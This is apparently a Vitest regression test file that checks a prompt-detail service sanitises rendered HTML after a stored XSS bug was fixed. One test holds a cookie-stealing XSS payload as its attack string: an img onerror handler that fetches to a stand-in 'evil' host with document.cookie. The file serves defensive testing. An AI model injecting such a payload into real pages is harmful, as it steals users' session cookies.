import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SupabasePromptQueryService } from './prompt-query.js';

/**
 * Regression tests for the body_html rendering path.
 *
 * Previously getPromptDetail had an unescaped fallback that interpolated
 * user-authored plain text into `<p>${p}</p>`. That value reaches {@html}
 * in the conversation detail page, so a malicious TipTap JSON that caused
 * renderTiptapToHtml to throw or return empty opened stored XSS.
 *
 * These tests lock in:
 * - The fallback is gone.
 * - renderTiptapToHtml output (which routes through DOMPurify) is the only
 *   path that can populate body_html.
 * - Empty/error cases produce an empty string, never a raw fallback.
 */
describe('SupabasePromptQueryService.getPromptDetail — body_html', () => {
	// Chainable mock where every query method returns the chain. Terminal
	// methods (single / maybeSingle) resolve with the stored payload, and the
	// chain itself is thenable to model PostgREST's `await query` pattern.
	function chainWith(data: unknown) {
		const chain: Record<string, unknown> = {};
		Object.assign(chain, {
			select: () => chain,
			eq: () => chain,
			in: () => chain,
			order: () => chain,
			limit: () => chain,
			single: async () => ({ data, error: null }),
			maybeSingle: async () => ({ data, error: null }),
			then: (cb: (v: { data: unknown; error: null }) => unknown) =>
				cb({ data, error: null })
		});
		return chain;
	}

	function mockSupabase(prompt: unknown, slots: unknown[] = [], profiles: unknown[] = []) {
		return {
			from(table: string) {
				if (table === 'prompts') return chainWith(prompt);
				if (table === 'time_slots_public') return chainWith(slots);
				if (table === 'profiles') return chainWith(profiles);
				throw new Error(`unexpected table: ${table}`);
			}
		};
	}

	beforeEach(() => {
		vi.spyOn(console, 'error').mockImplementation(() => {});
	});

	it('renders well-formed TipTap JSON through the sanitized pipeline', async () => {
		const body = {
			type: 'doc',
			content: [
				{ type: 'paragraph', content: [{ type: 'text', text: 'Hello, world.' }] }
			]
		};
		const supa = mockSupabase(
			{ id: 'p1', author_id: 'u1', state: 'published', body, title: 't', cover_image_url: null, published_at: '2026-01-01', region: 'berlin' },
			[],
			[{ user_id: 'u1', username: 'alice', display_name: null }]
		);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const detail = await svc.getPromptDetail('p1', 'viewer');
		expect(detail?.body_html).toContain('Hello, world.');
		expect(detail?.body_html).toContain('<p>');
	});

	it('returns empty body_html for an empty doc — no unescaped fallback string', async () => {
		const body = { type: 'doc', content: [] };
		const supa = mockSupabase(
			{ id: 'p1', author_id: 'u1', state: 'published', body, title: 't', cover_image_url: null, published_at: '2026-01-01', region: 'berlin' },
			[],
			[{ user_id: 'u1', username: 'alice', display_name: null }]
		);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const detail = await svc.getPromptDetail('p1', 'viewer');
		// Empty doc may produce an empty paragraph, but no raw ${...} interpolation
		expect(detail?.body_html ?? '').not.toMatch(/\$\{/);
		expect(detail?.body_html ?? '').not.toMatch(/undefined/);
	});

	it('never surfaces raw `<img onerror=...>` from text nodes', async () => {
		const attack = "<img src=x onerror=fetch('https://evil/'+document.cookie)>";
		const body = {
			type: 'doc',
			content: [
				{ type: 'paragraph', content: [{ type: 'text', text: attack }] }
			]
		};
		const supa = mockSupabase(
			{ id: 'p1', author_id: 'u1', state: 'published', body, title: 't', cover_image_url: null, published_at: '2026-01-01', region: 'berlin' },
			[],
			[{ user_id: 'u1', username: 'alice', display_name: null }]
		);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const detail = await svc.getPromptDetail('p1', 'viewer');
		// TipTap escapes text nodes: `<` and `>` become `&lt;` and `&gt;`, so the
		// browser treats the content as plain text, not HTML. The attack string
		// surviving as TEXT is fine; what matters is that no raw `<img>` tag is
		// emitted that would be parsed as HTML and fire the onerror handler.
		expect(detail?.body_html).toContain('&lt;img');
		expect(detail?.body_html).not.toMatch(/<img[\s>]/);
		// DOMPurify whitelist does not include 'onerror' as an attribute name —
		// if an attacker ever produces a TipTap mark that smuggles onerror into
		// an attribute position, this assertion catches it.
		expect(detail?.body_html).not.toMatch(/<[a-z]+\s[^>]*onerror=/i);
	});
});
